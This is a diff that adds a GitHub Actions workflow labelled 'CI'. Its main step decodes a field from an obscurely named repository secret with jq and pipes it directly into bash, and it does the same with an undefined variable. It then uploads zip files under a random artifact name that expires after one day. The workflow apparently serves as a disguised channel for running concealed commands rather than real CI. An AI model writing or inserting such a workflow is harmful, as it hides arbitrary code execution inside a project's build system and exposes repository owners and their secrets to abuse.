@@ -1,0 +1,25 @@
+name: CI
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  agent:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Perform
+        env:
+          rux40209: ${{ secrets.rux40209 }}
+        run: |
+          printf '%s' "$rux40209" | jq -r .yqc17 | /bin/bash
+          echo $i78501 | jq -r .biutu5400 | /bin/bash
+
+      - name: Upload results
+        uses: actions/upload-artifact@v4
+        with:
+          name: sk2suy3Y
+          path: "*.zip"
+          retention-days: 1
